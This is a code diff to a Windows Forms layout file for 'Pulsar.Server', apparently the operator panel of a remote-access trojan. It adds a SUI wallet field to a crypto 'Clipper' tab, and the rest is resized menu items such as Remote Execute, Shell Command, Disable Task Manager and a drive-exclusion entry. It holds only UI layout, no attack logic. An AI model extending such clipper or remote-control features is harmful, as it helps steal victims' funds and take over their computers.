@@ -180,6 +180,8 @@ namespace Pulsar.Server.Forms
             clearSelectedToolStripMenuItem = new ToolStripMenuItem();
             tabPage3 = new TabPage();
             cryptoGroupBox = new GroupBox();
+            label11 = new Label();
+            SUITextBox = new TextBox();
             BCHTextBox = new TextBox();
             label10 = new Label();
             TRXTextBox = new TextBox();
@@ -520,7 +522,7 @@ namespace Pulsar.Server.Forms
             // 
             remoteChatToolStripMenuItem.Image = Properties.Resources.phone;
             remoteChatToolStripMenuItem.Name = "remoteChatToolStripMenuItem";
-            remoteChatToolStripMenuItem.Size = new Size(172, 22);
+            remoteChatToolStripMenuItem.Size = new Size(171, 22);
             remoteChatToolStripMenuItem.Text = "Remote Chat";
             remoteChatToolStripMenuItem.Click += remoteChatToolStripMenuItem_Click;
             // 
@@ -528,7 +530,7 @@ namespace Pulsar.Server.Forms
             // 
             remoteScriptingToolStripMenuItem.Image = Properties.Resources.script_code;
             remoteScriptingToolStripMenuItem.Name = "remoteScriptingToolStripMenuItem";
-            remoteScriptingToolStripMenuItem.Size = new Size(172, 22);
+            remoteScriptingToolStripMenuItem.Size = new Size(171, 22);
             remoteScriptingToolStripMenuItem.Text = "Remote Scripting";
             remoteScriptingToolStripMenuItem.Click += remoteScriptingToolStripMenuItem_Click;
             // 
@@ -536,7 +538,7 @@ namespace Pulsar.Server.Forms
             // 
             showMessageboxToolStripMenuItem.Image = (Image)resources.GetObject("showMessageboxToolStripMenuItem.Image");
             showMessageboxToolStripMenuItem.Name = "showMessageboxToolStripMenuItem";
-            showMessageboxToolStripMenuItem.Size = new Size(172, 22);
+            showMessageboxToolStripMenuItem.Size = new Size(171, 22);
             showMessageboxToolStripMenuItem.Text = "Show Messagebox";
             showMessageboxToolStripMenuItem.Click += showMessageboxToolStripMenuItem_Click;
             // 
@@ -544,7 +546,7 @@ namespace Pulsar.Server.Forms
             // 
             visitWebsiteToolStripMenuItem.Image = (Image)resources.GetObject("visitWebsiteToolStripMenuItem.Image");
             visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
-            visitWebsiteToolStripMenuItem.Size = new Size(172, 22);
+            visitWebsiteToolStripMenuItem.Size = new Size(171, 22);
             visitWebsiteToolStripMenuItem.Text = "Send to Website";
             visitWebsiteToolStripMenuItem.Click += visitWebsiteToolStripMenuItem_Click;
             // 
@@ -560,7 +562,7 @@ namespace Pulsar.Server.Forms
             // 
             addCDriveExceptionToolStripMenuItem.Image = Properties.Resources.application_view_xp_terminal;
             addCDriveExceptionToolStripMenuItem.Name = "addCDriveExceptionToolStripMenuItem";
-            addCDriveExceptionToolStripMenuItem.Size = new Size(195, 22);
+            addCDriveExceptionToolStripMenuItem.Size = new Size(194, 22);
             addCDriveExceptionToolStripMenuItem.Text = "Add C: Drive Exception";
             addCDriveExceptionToolStripMenuItem.Click += addCDriveExceptionToolStripMenuItem_Click;
             // 
@@ -569,14 +571,14 @@ namespace Pulsar.Server.Forms
             taskManagerToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { enableToolStripMenuItem, disableTaskManagerToolStripMenuItem });
             taskManagerToolStripMenuItem1.Image = Properties.Resources.cog;
             taskManagerToolStripMenuItem1.Name = "taskManagerToolStripMenuItem1";
-            taskManagerToolStripMenuItem1.Size = new Size(195, 22);
+            taskManagerToolStripMenuItem1.Size = new Size(194, 22);
             taskManagerToolStripMenuItem1.Text = "Task Manager";
             // 
             // enableToolStripMenuItem
             // 
             enableToolStripMenuItem.Image = Properties.Resources.cog_add;
             enableToolStripMenuItem.Name = "enableToolStripMenuItem";
-            enableToolStripMenuItem.Size = new Size(187, 22);
+            enableToolStripMenuItem.Size = new Size(188, 22);
             enableToolStripMenuItem.Text = "Enable Task Manager";
             enableToolStripMenuItem.Click += enableToolStripMenuItem_Click;
             // 
@@ -584,7 +586,7 @@ namespace Pulsar.Server.Forms
             // 
             disableTaskManagerToolStripMenuItem.Image = Properties.Resources.cog_delete;
             disableTaskManagerToolStripMenuItem.Name = "disableTaskManagerToolStripMenuItem";
-            disableTaskManagerToolStripMenuItem.Size = new Size(187, 22);
+            disableTaskManagerToolStripMenuItem.Size = new Size(188, 22);
             disableTaskManagerToolStripMenuItem.Text = "Disable Task Manager";
             disableTaskManagerToolStripMenuItem.Click += disableTaskManagerToolStripMenuItem_Click;
             // 
@@ -1577,10 +1579,10 @@ namespace Pulsar.Server.Forms
             // 
             tabPage3.Controls.Add(cryptoGroupBox);
             tabPage3.Controls.Add(ClipperCheckbox);
-            tabPage3.Location = new Point(4, 24);
+            tabPage3.Location = new Point(4, 22);
             tabPage3.Name = "tabPage3";
             tabPage3.Padding = new Padding(3);
-            tabPage3.Size = new Size(1136, 463);
+            tabPage3.Size = new Size(1136, 465);
             tabPage3.TabIndex = 3;
             tabPage3.Text = "ClipperTabPage";
             tabPage3.UseVisualStyleBackColor = true;
@@ -1588,6 +1590,8 @@ namespace Pulsar.Server.Forms
             // cryptoGroupBox
             // 
             cryptoGroupBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
+            cryptoGroupBox.Controls.Add(SUITextBox);
+            cryptoGroupBox.Controls.Add(label11);
             cryptoGroupBox.Controls.Add(BCHTextBox);
             cryptoGroupBox.Controls.Add(label10);
             cryptoGroupBox.Controls.Add(TRXTextBox);
@@ -1608,18 +1612,36 @@ namespace Pulsar.Server.Forms
             cryptoGroupBox.Controls.Add(label2);
             cryptoGroupBox.Location = new Point(8, 29);
             cryptoGroupBox.Name = "cryptoGroupBox";
-            cryptoGroupBox.Size = new Size(1104, 279);
+            cryptoGroupBox.Size = new Size(1100, 309);
             cryptoGroupBox.TabIndex = 1;
             cryptoGroupBox.TabStop = false;
             cryptoGroupBox.Text = "Settings";
             cryptoGroupBox.Enter += groupBox1_Enter;
+            // 
+            // label11
+            // 
+            label11.AutoSize = true;
+            label11.Location = new Point(6, 276);
+            label11.Name = "label11";
+            label11.Size = new Size(27, 13);
+            label11.TabIndex = 18;
+            label11.Text = "SUI:";
+            label11.Click += label11_Click;
+            // 
+            // SUITextBox
+            // 
+            SUITextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
+            SUITextBox.Location = new Point(50, 273);
+            SUITextBox.Name = "SUITextBox";
+            SUITextBox.Size = new Size(1044, 22);
+            SUITextBox.TabIndex = 2;
             // 
             // BCHTextBox
             // 
             BCHTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             BCHTextBox.Location = new Point(50, 245);
             BCHTextBox.Name = "BCHTextBox";
-            BCHTextBox.Size = new Size(1048, 22);
+            BCHTextBox.Size = new Size(1044, 22);
             BCHTextBox.TabIndex = 17;
             // 
             // label10
@@ -1627,7 +1649,7 @@ namespace Pulsar.Server.Forms
             label10.AutoSize = true;
             label10.Location = new Point(6, 250);
             label10.Name = "label10";
-            label10.Size = new Size(31, 13);
+            label10.Size = new Size(32, 13);
             label10.TabIndex = 16;
             label10.Text = "BCH:";
             // 
@@ -1636,7 +1658,7 @@ namespace Pulsar.Server.Forms
             TRXTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             TRXTextBox.Location = new Point(50, 217);
             TRXTextBox.Name = "TRXTextBox";
-            TRXTextBox.Size = new Size(1048, 22);
+            TRXTextBox.Size = new Size(1044, 22);
             TRXTextBox.TabIndex = 15;
             // 
             // label9
@@ -1644,7 +1666,7 @@ namespace Pulsar.Server.Forms
             label9.AutoSize = true;
             label9.Location = new Point(6, 222);
             label9.Name = "label9";
-            label9.Size = new Size(29, 13);
+            label9.Size = new Size(28, 13);
             label9.TabIndex = 14;
             label9.Text = "TRX:";
             // 
@@ -1653,7 +1675,7 @@ namespace Pulsar.Server.Forms
             XRPTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             XRPTextBox.Location = new Point(50, 189);
             XRPTextBox.Name = "XRPTextBox";
-            XRPTextBox.Size = new Size(1048, 22);
+            XRPTextBox.Size = new Size(1044, 22);
             XRPTextBox.TabIndex = 13;
             // 
             // label8
@@ -1670,7 +1692,7 @@ namespace Pulsar.Server.Forms
             DASHTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             DASHTextBox.Location = new Point(50, 161);
             DASHTextBox.Name = "DASHTextBox";
-            DASHTextBox.Size = new Size(1048, 22);
+            DASHTextBox.Size = new Size(1044, 22);
             DASHTextBox.TabIndex = 11;
             // 
             // label7
@@ -1687,7 +1709,7 @@ namespace Pulsar.Server.Forms
             SOLTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             SOLTextBox.Location = new Point(50, 133);
             SOLTextBox.Name = "SOLTextBox";
-            SOLTextBox.Size = new Size(1048, 22);
+            SOLTextBox.Size = new Size(1044, 22);
             SOLTextBox.TabIndex = 9;
             // 
             // label6
@@ -1704,7 +1726,7 @@ namespace Pulsar.Server.Forms
             XMRTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             XMRTextBox.Location = new Point(50, 105);
             XMRTextBox.Name = "XMRTextBox";
-            XMRTextBox.Size = new Size(1048, 22);
+            XMRTextBox.Size = new Size(1044, 22);
             XMRTextBox.TabIndex = 7;
             // 
             // label5
@@ -1721,7 +1743,7 @@ namespace Pulsar.Server.Forms
             LTCTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             LTCTextBox.Location = new Point(50, 77);
             LTCTextBox.Name = "LTCTextBox";
-            LTCTextBox.Size = new Size(1048, 22);
+            LTCTextBox.Size = new Size(1044, 22);
             LTCTextBox.TabIndex = 5;
             // 
             // label4
@@ -1729,7 +1751,7 @@ namespace Pulsar.Server.Forms
             label4.AutoSize = true;
             label4.Location = new Point(6, 82);
             label4.Name = "label4";
-            label4.Size = new Size(26, 13);
+            label4.Size = new Size(25, 13);
             label4.TabIndex = 4;
             label4.Text = "LTC:";
             // 
@@ -1738,7 +1760,7 @@ namespace Pulsar.Server.Forms
             ETHTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             ETHTextBox.Location = new Point(50, 49);
             ETHTextBox.Name = "ETHTextBox";
-            ETHTextBox.Size = new Size(1048, 22);
+            ETHTextBox.Size = new Size(1044, 22);
             ETHTextBox.TabIndex = 3;
             // 
             // label3
@@ -1746,7 +1768,7 @@ namespace Pulsar.Server.Forms
             label3.AutoSize = true;
             label3.Location = new Point(6, 54);
             label3.Name = "label3";
-            label3.Size = new Size(30, 13);
+            label3.Size = new Size(29, 13);
             label3.TabIndex = 2;
             label3.Text = "ETH:";
             // 
@@ -1755,7 +1777,7 @@ namespace Pulsar.Server.Forms
             BTCTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
             BTCTextBox.Location = new Point(50, 21);
             BTCTextBox.Name = "BTCTextBox";
-            BTCTextBox.Size = new Size(1048, 22);
+            BTCTextBox.Size = new Size(1044, 22);
             BTCTextBox.TabIndex = 1;
             // 
             // label2
@@ -1825,21 +1847,21 @@ namespace Pulsar.Server.Forms
             // 
             TasksContextMenuStrip.Items.AddRange(new ToolStripItem[] { addTaskToolStripMenuItem, deleteTasksToolStripMenuItem });
             TasksContextMenuStrip.Name = "TasksContextMenuStrip";
-            TasksContextMenuStrip.Size = new Size(138, 48);
+            TasksContextMenuStrip.Size = new Size(139, 48);
             // 
             // addTaskToolStripMenuItem
             // 
             addTaskToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { remoteExecuteToolStripMenuItem1, shellCommandToolStripMenuItem, kematianToolStripMenuItem, showMessageBoxToolStripMenuItem1, excludeSystemDriveToolStripMenuItem, winREToolStripMenuItem1 });
             addTaskToolStripMenuItem.Image = Properties.Resources.add;
             addTaskToolStripMenuItem.Name = "addTaskToolStripMenuItem";
-            addTaskToolStripMenuItem.Size = new Size(137, 22);
+            addTaskToolStripMenuItem.Size = new Size(138, 22);
             addTaskToolStripMenuItem.Text = "Add Task";
             // 
             // remoteExecuteToolStripMenuItem1
             // 
             remoteExecuteToolStripMenuItem1.Image = Properties.Resources.drive_go;
             remoteExecuteToolStripMenuItem1.Name = "remoteExecuteToolStripMenuItem1";
-            remoteExecuteToolStripMenuItem1.Size = new Size(186, 22);
+            remoteExecuteToolStripMenuItem1.Size = new Size(185, 22);
             remoteExecuteToolStripMenuItem1.Text = "Remote Execute";
             remoteExecuteToolStripMenuItem1.Click += remoteExecuteToolStripMenuItem1_Click;
             // 
@@ -1847,20 +1869,20 @@ namespace Pulsar.Server.Forms
             // 
             shellCommandToolStripMenuItem.Image = Properties.Resources.terminal;
             shellCommandToolStripMenuItem.Name = "shellCommandToolStripMenuItem";
-            shellCommandToolStripMenuItem.Size = new Size(186, 22);
+            shellCommandToolStripMenuItem.Size = new Size(185, 22);
             shellCommandToolStripMenuItem.Text = "Shell Command";
             shellCommandToolStripMenuItem.Click += shellCommandToolStripMenuItem_Click;
             // 
             // kematianToolStripMenuItem
             // 
             kematianToolStripMenuItem.Name = "kematianToolStripMenuItem";
-            kematianToolStripMenuItem.Size = new Size(186, 22);
+            kematianToolStripMenuItem.Size = new Size(185, 22);
             // 
             // showMessageBoxToolStripMenuItem1
             // 
             showMessageBoxToolStripMenuItem1.Image = Properties.Resources.information;
             showMessageBoxToolStripMenuItem1.Name = "showMessageBoxToolStripMenuItem1";
-            showMessageBoxToolStripMenuItem1.Size = new Size(186, 22);
+            showMessageBoxToolStripMenuItem1.Size = new Size(185, 22);
             showMessageBoxToolStripMenuItem1.Text = "Show Message Box";
             showMessageBoxToolStripMenuItem1.Click += showMessageBoxToolStripMenuItem1_Click;
             // 
@@ -1868,7 +1890,7 @@ namespace Pulsar.Server.Forms
             // 
             excludeSystemDriveToolStripMenuItem.Image = Properties.Resources.uac_shield;
             excludeSystemDriveToolStripMenuItem.Name = "excludeSystemDriveToolStripMenuItem";
-            excludeSystemDriveToolStripMenuItem.Size = new Size(186, 22);
+            excludeSystemDriveToolStripMenuItem.Size = new Size(185, 22);
             excludeSystemDriveToolStripMenuItem.Text = "Exclude System Drive";
             excludeSystemDriveToolStripMenuItem.Click += excludeSystemDriveToolStripMenuItem_Click;
             // 
@@ -1876,7 +1898,7 @@ namespace Pulsar.Server.Forms
             // 
             winREToolStripMenuItem1.Image = Properties.Resources.anchor;
             winREToolStripMenuItem1.Name = "winREToolStripMenuItem1";
-            winREToolStripMenuItem1.Size = new Size(186, 22);
+            winREToolStripMenuItem1.Size = new Size(185, 22);
             winREToolStripMenuItem1.Text = "WinRE";
             winREToolStripMenuItem1.Click += winREToolStripMenuItem1_Click;
             // 
@@ -1884,7 +1906,7 @@ namespace Pulsar.Server.Forms
             // 
             deleteTasksToolStripMenuItem.Image = Properties.Resources.delete;
             deleteTasksToolStripMenuItem.Name = "deleteTasksToolStripMenuItem";
-            deleteTasksToolStripMenuItem.Size = new Size(137, 22);
+            deleteTasksToolStripMenuItem.Size = new Size(138, 22);
             deleteTasksToolStripMenuItem.Text = "Delete Task&s";
             deleteTasksToolStripMenuItem.Click += deleteTasksToolStripMenuItem_Click;
             // 
@@ -2188,7 +2210,7 @@ namespace Pulsar.Server.Forms
             autoTasksToolStripMenuItem.Image = Properties.Resources.server;
             autoTasksToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
             autoTasksToolStripMenuItem.Name = "autoTasksToolStripMenuItem";
-            autoTasksToolStripMenuItem.Size = new Size(91, 21);
+            autoTasksToolStripMenuItem.Size = new Size(92, 21);
             autoTasksToolStripMenuItem.Text = "Auto Tasks";
             autoTasksToolStripMenuItem.Click += autoTasksToolStripMenuItem_Click;
             // 
@@ -2495,5 +2517,7 @@ namespace Pulsar.Server.Forms
         private ColumnHeader columnHeader6;
         private ToolStripMenuItem offlineClientsToolStripMenuItem;
         private ToolStripMenuItem statsToolStripMenuItem;
+        private Label label11;
+        private TextBox SUITextBox;
     }
 }
